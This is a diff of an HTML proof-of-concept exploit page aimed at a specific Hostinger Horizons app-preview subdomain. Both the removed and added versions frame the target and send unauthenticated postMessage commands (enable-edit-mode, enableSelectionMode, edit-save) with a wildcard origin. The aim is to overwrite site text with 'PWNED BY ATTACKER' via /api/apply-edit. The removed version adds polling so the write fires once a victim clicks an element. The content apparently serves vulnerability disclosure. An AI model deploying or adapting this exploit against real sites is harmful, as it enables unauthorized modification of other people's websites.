@@ -3,184 +3,76 @@
 <head>
   <title>PoC - Hostinger app-preview postMessage no origin check</title>
   <style>
-    * { box-sizing: border-box; }
-    body { font-family: monospace; background: #1a1a1a; color: #0f0; padding: 20px; margin: 0; }
-    h2 { color: #fff; margin-bottom: 4px; }
-    .meta { color: #888; font-size: 13px; margin-bottom: 14px; }
-    .meta strong { color: #ff0; }
-
-    #status {
-      border: 2px solid #555; border-radius: 6px;
-      padding: 12px 16px; margin-bottom: 10px;
-      font-size: 15px; min-height: 50px; background: #111;
-    }
-    #status.waiting { border-color: #555; color: #888; }
-    #status.ready   { border-color: #ff0; color: #ff0; }
-    #status.success { border-color: #0f0; color: #0f0; }
-    #status.error   { border-color: #f44; color: #f44; }
-
-    .btns { margin-bottom: 10px; display: flex; gap: 8px; }
-    button {
-      background: #0f0; color: #000; border: none;
-      padding: 9px 18px; cursor: pointer; font-weight: bold;
-      font-family: monospace; font-size: 13px; border-radius: 3px;
-    }
-    button.grey { background: #444; color: #ccc; }
-
-    #log {
-      background: #000; border: 1px solid #333; border-radius: 4px;
-      padding: 10px; height: 120px; overflow-y: auto;
-      font-size: 12px; margin-bottom: 10px;
-    }
-    .s  { color: #f90; }
-    .r  { color: #0af; }
-    .ok { color: #0f0; font-weight: bold; }
-    .er { color: #f44; }
-    .i  { color: #666; }
-
-    iframe {
-      width: 100%; height: 460px;
-      border: 3px solid #555; border-radius: 4px; display: block;
-    }
-    iframe.armed { border-color: #ff0; }
-    iframe.done  { border-color: #0f0; }
+    body { font-family: monospace; background: #1a1a1a; color: #0f0; padding: 20px; }
+    #log { background: #000; padding: 10px; height: 200px; overflow-y: auto; border: 1px solid #0f0; }
+    iframe { width: 100%; height: 500px; border: 2px solid red; }
+    button { background: #0f0; color: #000; border: none; padding: 8px 16px; margin: 4px; cursor: pointer; font-weight: bold; }
   </style>
 </head>
 <body>
+  <h2>PoC: app-preview.com postMessage — no origin check</h2>
+  <p>Origin of THIS page: <strong id="origin"></strong></p>
+  <p>Target iframe: <strong>https://8f07ab61-4993-4c92-87a6-32869d1ca162.app-preview.com</strong></p>
 
-<h2>PoC: Hostinger Horizons — postMessage origin bypass → unauthorized website edit</h2>
-<div class="meta">
-  Attacker origin: <strong id="my-origin"></strong> &nbsp;·&nbsp;
-  NOT in <code>ALLOWED_PARENT_ORIGINS</code> &nbsp;·&nbsp;
-  Target: <strong>https://8f07ab61-4993-4c92-87a6-32869d1ca162.app-preview.com</strong>
-</div>
+  <div>
+    <button onclick="sendMsg('enable-edit-mode')">1. Send enable-edit-mode</button>
+    <button onclick="sendMsg('enableSelectionMode')">2. Send enableSelectionMode</button>
+    <button onclick="sendEditSave()">3. Send edit-save</button>
+    <button onclick="sendMsg('disable-edit-mode')">4. Send disable-edit-mode</button>
+    <button onclick="sendAll()">RUN ALL (auto)</button>
+  </div>
 
-<div id="status" class="waiting">Waiting for iframe to load…</div>
+  <div id="log"></div>
 
-<div class="btns">
-  <button onclick="startAttack()">▶ START ATTACK</button>
-  <button onclick="resetAll()" class="grey">↺ Reset</button>
-</div>
+  <iframe id="target" src="https://8f07ab61-4993-4c92-87a6-32869d1ca162.app-preview.com/"></iframe>
 
-<div id="log"></div>
+  <script>
+    document.getElementById('origin').textContent = window.location.origin;
 
-<iframe id="target"
-  src="https://8f07ab61-4993-4c92-87a6-32869d1ca162.app-preview.com/">
-</iframe>
+    const log = (msg) => {
+      const el = document.getElementById('log');
+      const ts = new Date().toISOString().split('T')[1].slice(0,8);
+      el.innerHTML += `[${ts}] ${msg}<br>`;
+      el.scrollTop = el.scrollHeight;
+      console.log('[POC]', msg);
+    };
 
-<script>
-  const PAYLOAD = 'PWNED BY ATTACKER — postMessage no origin check';
-  const TARGET  = 'https://8f07ab61-4993-4c92-87a6-32869d1ca162.app-preview.com/';
+    const iframe = document.getElementById('target');
 
-  document.getElementById('my-origin').textContent = window.location.origin;
-
-  const iframe   = document.getElementById('target');
-  const logEl    = document.getElementById('log');
-  const statusEl = document.getElementById('status');
-
-  let pollTimer   = null;
-  let attackDone  = false;
-
-  // ── helpers ────────────────────────────────────────────────────────────────
-
-  function log(msg, cls = 'i') {
-    const ts = new Date().toISOString().split('T')[1].slice(0, 12);
-    logEl.innerHTML += `<span class="${cls}">[${ts}] ${msg}</span><br>`;
-    logEl.scrollTop = logEl.scrollHeight;
-  }
-
-  function setStatus(msg, cls) {
-    statusEl.textContent = msg;
-    statusEl.className = cls;
-  }
-
-  function send(type, payload) {
-    const msg = payload !== undefined ? { type, payload } : { type };
-    iframe.contentWindow.postMessage(msg, '*');
-  }
-
-  // ── main attack ────────────────────────────────────────────────────────────
-
-  function startAttack() {
-    attackDone = false;
-    clearInterval(pollTimer);
-    iframe.classList.add('armed');
-
-    log('Sending enable-edit-mode from ' + window.location.origin, 's');
-    send('enable-edit-mode');
-
-    setStatus('② Edit mode active. Click any text inside the preview below. Attack fires automatically.', 'ready');
-    log('Edit mode sent. Now click "Hello" (or any text) inside the iframe.', 'i');
-    log('Polling edit-save every 1s — fires the moment you click an element.', 'i');
-
-    // Poll edit-save every second.
-    // When currentEditingInfo is null → silent TypeError inside iframe, no POST.
-    // When user clicks any data-edit-id element → currentEditingInfo set → next poll hits.
-    pollTimer = setInterval(() => {
-      if (attackDone) { clearInterval(pollTimer); return; }
-      send('edit-save', { newText: PAYLOAD });
-      log('→ POLL  edit-save sent (waiting for element click to set currentEditingInfo)', 's');
-    }, 1000);
-  }
-
-  // ── listen for messages from app-preview ──────────────────────────────────
-
-  window.addEventListener('message', (event) => {
-    if (!event.origin.includes('app-preview') && !event.origin.includes('horizons')) return;
-
-    const type = event.data?.type || event.data?.message;
-
-    // editEnter: user clicked an editable element → currentEditingInfo is now set
-    if (type === 'editEnter') {
-      const txt = event.data?.payload?.currentText || '?';
-      log(`← editEnter received — element clicked, currentText="${txt}". Next poll fires the attack.`, 'r');
-      setStatus(`Element clicked ("${txt}"). Firing edit-save now…`, 'ready');
-
-      // Fire immediately, don't wait for next poll interval
-      clearInterval(pollTimer);
-      setTimeout(() => send('edit-save', { newText: PAYLOAD }), 100);
-      log('→ IMMEDIATE  edit-save fired', 'ok');
+    function sendMsg(type, payload) {
+      const msg = payload ? { type, payload } : { type };
+      iframe.contentWindow.postMessage(msg, '*');
+      log(`SENT → type="${type}" payload=${JSON.stringify(payload || null)}`);
     }
 
-    // editApplied: server confirmed the write (if parent origin check passes)
-    if (type === 'editApplied') {
-      attackDone = true;
-      clearInterval(pollTimer);
-      iframe.classList.remove('armed');
-      iframe.classList.add('done');
-      const editId = event.data?.payload?.editId;
-      log(`← editApplied — editId="${editId}" — SERVER CONFIRMED WRITE`, 'ok');
-      setStatus('SUCCESS — /api/apply-edit returned 200. File overwritten on server.', 'success');
+    function sendEditSave() {
+      // Send edit-save - triggers handleEditSave() → POST /api/apply-edit
+      sendMsg('edit-save', { newText: 'PWNED BY ATTACKER - postMessage no origin check' });
     }
 
-    // route-changed: HMR reloaded iframe after edit — state reset
-    if (type === 'route-changed' && !attackDone) {
-      clearInterval(pollTimer);
-      log('← route-changed: HMR reloaded iframe. State reset. Click ↺ Reset to retry.', 'er');
-      setStatus('Iframe reloaded (HMR fired after edit). Click ↺ Reset then ▶ Start again.', 'error');
-      iframe.classList.remove('armed', 'done');
+    function sendAll() {
+      log('--- Starting attack sequence ---');
+      setTimeout(() => sendMsg('enable-edit-mode'), 500);
+      setTimeout(() => sendMsg('enableSelectionMode'), 1500);
+      setTimeout(() => sendEditSave(), 3000);
+      setTimeout(() => {
+        log('--- Sequence complete. Check /api/apply-edit in network tab ---');
+      }, 3500);
     }
-  });
 
-  // ── reset ─────────────────────────────────────────────────────────────────
+    // Listen for any messages coming BACK from the iframe
+    window.addEventListener('message', (event) => {
+      if (event.origin.includes('app-preview')) {
+        log(`RECEIVED ← origin="${event.origin}" type="${event.data?.type}" data=${JSON.stringify(event.data).slice(0,200)}`);
+      }
+    });
 
-  function resetAll() {
-    attackDone = false;
-    clearInterval(pollTimer);
-    iframe.classList.remove('armed', 'done');
-    setStatus('Reloading iframe…', 'waiting');
-    log('--- Reset: reloading iframe ---', 'i');
-    iframe.src = TARGET + '?t=' + Date.now();
-  }
+    iframe.addEventListener('load', () => {
+      log('iframe loaded ✓ — ready to send messages');
+    });
 
-  // ── on iframe load ─────────────────────────────────────────────────────────
-
-  iframe.addEventListener('load', () => {
-    log('iframe loaded ✓  attacker origin: ' + window.location.origin, 'i');
-    setStatus('Iframe loaded. Click ▶ START ATTACK.', 'ready');
-  });
-
-  log('PoC loaded. Origin: ' + window.location.origin + ' (NOT in ALLOWED_PARENT_ORIGINS)', 'i');
-</script>
+    log('PoC loaded. Iframe embedding app-preview from foreign origin.');
+    log('This origin is NOT in ALLOWED_PARENT_ORIGINS — but edit-save has no check!');
+  </script>
 </body>
 </html>
